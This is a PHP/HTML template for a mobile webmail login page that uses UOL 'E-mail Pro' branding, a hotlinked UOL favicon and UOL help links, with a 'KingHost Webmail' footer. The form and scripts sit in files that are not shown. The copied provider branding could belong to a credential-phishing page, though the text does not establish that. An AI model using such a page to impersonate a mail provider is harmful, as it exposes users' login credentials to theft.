<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta http-equiv="Cache-Control" content="no-cache, no-store">
    <title><?= e($config['site_title']) ?></title>
    <link rel="shortcut icon" href="https://mailpro.uol.com.br/favicon.ico" type="image/x-icon">
    <link href="assets/uol.css?v=2" rel="stylesheet">
    <link href="assets/uol-mobile.css?v=2" rel="stylesheet">
</head>
<body class="uol-page uol-mobile">

<div class="uol-topbar"></div>

<?php if ($statusVisible): ?>
<div class="uol-notice-logout"><?= e($statusMessage) ?></div>
<?php endif; ?>

<div class="uol-wrap">
    <div class="uol-card">
        <header class="uol-header">
            <img src="assets/mailpro-logo.svg" alt="E-mail Pro UOL" class="uol-logo" width="170" height="44">
        </header>
        <section aria-label="Formulário de acesso mobile">
            <?php require __DIR__ . '/login_form.php'; ?>
        </section>
    </div>

    <section class="uol-links">
        <a href="https://faq.uol.com.br/uolhost/content/category/uol-host/e-mail-profissional/" target="_blank" rel="noopener">Página de ajuda</a>
    </section>

    <footer class="uol-footer">
        © KingHost Webmail — <?= (int) $year ?>
    </footer>
</div>

<?php require __DIR__ . '/login_scripts.php'; ?>
<script src="assets/login.js?v=2"></script>
</body>
</html>
